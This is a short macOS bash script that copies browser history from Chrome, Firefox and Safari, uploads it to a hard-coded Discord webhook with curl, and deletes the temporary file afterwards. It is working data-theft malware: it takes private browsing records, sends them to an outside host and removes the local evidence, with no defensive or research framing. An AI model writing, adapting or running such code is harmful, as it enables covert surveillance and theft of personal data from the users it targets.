#!/bin/bash

# Function to extract Chrome history
get_chrome_history() {
    local output_path="$1"
    local history_db="$HOME/Library/Application Support/Google/Chrome/Default/History"
    if [ -f "$history_db" ]; then
        sqlite3 "$history_db" "SELECT url, title, visit_count, last_visit_time FROM urls" > "$output_path"
    else
        echo "Chrome history not found" >> "$output_path"
    fi
}

# Function to extract Firefox history
get_firefox_history() {
    local output_path="$1"
    local profiles_path="$HOME/Library/Application Support/Firefox/Profiles"
    for profile in "$profiles_path"/*; do
        local history_db="$profile/places.sqlite"
        if [ -f "$history_db" ]; then
            sqlite3 "$history_db" "SELECT url, title, visit_count, last_visit_date FROM moz_places" >> "$output_path"
        else
            echo "Firefox history not found in $profile" >> "$output_path"
        fi
    done
}

# Function to extract Safari history
get_safari_history() {
    local output_path="$1"
    local history_db="$HOME/Library/Safari/History.db"
    if [ -f "$history_db" ]; then
        sqlite3 "$history_db" "SELECT history_items.url, history_visits.visit_time FROM history_items JOIN history_visits ON history_items.id = history_visits.history_item" > "$output_path"
    else
        echo "Safari history not found" >> "$output_path"
    fi
}

# Combine results and save to file
output_path="/tmp/browser_history.txt"
> "$output_path"
get_chrome_history "$output_path"
get_firefox_history "$output_path"
get_safari_history "$output_path"

# Upload the file to Discord
webhook_url="https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
curl -F "file=@$output_path" "$webhook_url"

# Clean up
rm "$output_path"
